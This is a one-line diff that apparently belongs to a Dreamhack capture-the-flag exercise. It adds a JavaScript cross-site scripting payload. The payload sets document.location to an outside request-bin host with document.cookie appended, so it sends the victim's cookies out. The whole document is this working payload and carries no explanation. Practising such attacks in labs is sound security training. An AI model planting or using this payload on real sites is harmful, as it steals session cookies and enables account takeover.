@@ -1,0 +1,1 @@
+document.location="https://mcbcgjh.request.dreamhack.games/"+document.cookie
